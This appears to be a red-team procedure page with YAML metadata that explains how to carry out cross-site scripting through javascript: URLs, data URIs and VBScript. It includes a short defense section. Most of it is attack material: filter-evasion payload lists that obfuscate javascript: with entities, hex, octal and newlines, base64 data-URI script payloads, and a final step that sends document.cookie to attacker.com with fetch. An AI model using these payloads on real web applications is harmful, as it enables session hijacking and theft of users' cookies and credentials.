---
type: procedure
description: >-
  Demonstrates multiple techniques for injecting XSS payloads using JavaScript
  protocols, Data URIs, and VBScript in vulnerable web applications.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - cross-site-scripting
  - xss
  - javascript
  - data-uri
  - vbscript
commands: []
platforms:
  - Web
  - Browser
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/OWASP-ZAP]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# xss-injection-via-javascript-data-uri-vbscript

## Summary

This procedure outlines techniques for executing Cross-Site Scripting (XSS) attacks by injecting malicious scripts via JavaScript protocols, Data URIs, and VBScript in vulnerable web applications. These methods bypass basic input sanitization to execute arbitrary code in the victim's browser, enabling theft of session cookies, credentials, or keystrokes.

## Description

XSS vulnerabilities occur when web applications fail to properly sanitize user input, allowing attackers to inject and execute scripts in the context of other users' browsers. This procedure covers three primary injection vectors: JavaScript protocol handlers (e.g., javascript:alert(1)), Data URIs that embed HTML and scripts, and VBScript for Internet Explorer-specific attacks. These techniques are useful in reflected or stored XSS scenarios, such as search fields, URL parameters, or comment sections. The target environment is typically client-side web applications running on modern browsers, with prerequisites including identification of unsanitized input fields via tools like Burp Suite. Successful execution leads to client-side code execution, potentially resulting in session hijacking or further exploitation.

## Requirements

1. Access to a vulnerable web application with reflected or stored input fields (e.g., via developer tools or proxy interception).
2. Knowledge of encoding techniques to evade filters (e.g., URL encoding, HTML entities).
3. Tools such as [[tools/Burp-Suite]] or [[tools/OWASP-ZAP]] for intercepting and modifying requests.
4. A testing environment or lab setup to avoid impacting production systems.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., using HTML entity encoding for user input).
- Deploy Content Security Policy (CSP) headers to restrict script sources and block inline scripts or data URIs.
- Use Web Application Firewalls (WAFs) to detect and block common XSS patterns, including encoded payloads.
- Enable browser security features like XSS Auditor (deprecated in modern browsers) or strict CSP modes.
- Regularly scan applications with tools like OWASP ZAP for XSS vulnerabilities and apply patches.

## Objectives

1. Inject and execute malicious scripts in victim browsers to demonstrate XSS impact.
2. Evade basic sanitization using encoding and protocol wrappers.
3. Steal sensitive data such as cookies or perform actions on behalf of the user.
4. Establish a foundation for chaining XSS with other attacks like session hijacking.

## Instructions

### Step 1: Identify Vulnerable Input and Test JavaScript Injection

**Context**: Locate an input field or parameter that reflects user input without sanitization (e.g., a search box). Use encoding techniques to inject JavaScript protocol handlers, which execute when the page loads or links are followed. This step bypasses filters that block direct <script> tags.

**Code** ([[codes/javascript-xss-injection-techniques]]):

```javascript
javascript:prompt(1)

%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341

&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41

We can encode the "javascript:" in Hex/Octal
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\x63\u0072\u0069\u0070\u0074\x003aalert(1)
\152\141\166\141\163\143\162\151\160\164\072alert(1)

We can use a 'newline character'
java%0ascript:alert(1)   - LF (\n)
java%09script:alert(1)   - Horizontal tab (\t)
java%0dscript:alert(1)   - CR (\r)

Using the escape character
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

Using the newline and a comment //
javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
```

> Submit the payload in the vulnerable field using [[tools/Burp-Suite]] to intercept and modify the request. If the alert or prompt fires, the injection succeeded. Why: These encodings (HTML entities, hex, newlines) evade keyword-based filters while preserving execution.

### Step 2: Inject XSS via Data URI

**Context**: For inputs that allow resource loading (e.g., img src or CSS background), craft a Data URI that embeds executable HTML and scripts. This method is stealthy as it mimics legitimate resource requests and works in contexts blocking direct script tags.

**Code** ([[codes/data-uri-xss-payloads]]):

```javascript
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+>
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

> Intercept the request with [[tools/OWASP-ZAP]], replace the resource parameter (e.g., src="userinput") with the Data URI payload, and forward. Verify by checking if the script executes (e.g., alert pops). Why: Data URIs are base64-encoded to hide the payload, and SVG onload triggers execution without <script> tags.

### Step 3: Execute VBScript Injection for IE Compatibility

**Context**: Target legacy Internet Explorer browsers by injecting VBScript protocol handlers. This is useful in environments with older systems where JavaScript is heavily filtered but VBScript is overlooked.

**Code** ([[codes/vbscript-xss-payload]]):

```javascript
vbscript:msgbox("XSS")
```

> Use [[tools/Burp-Suite]] to inject the payload into a link or input that gets rendered as href or onclick. Test in IE; a message box should appear. Why: VBScript executes only in IE, providing a vector for targeted attacks, and the protocol mimics javascript: but uses a different handler.

### Step 4: Verify and Escalate

**Context**: After successful injection, capture data (e.g., document.cookie) and exfiltrate via a request to an attacker-controlled server. Decision point: If CSP blocks, try alternative encodings; otherwise, chain to steal sessions.

> Modify payloads to include data exfiltration, e.g., append `;fetch('http://attacker.com?cookie='+document.cookie)` to JavaScript injections. Monitor your server for incoming data. Success: Data received confirms control.
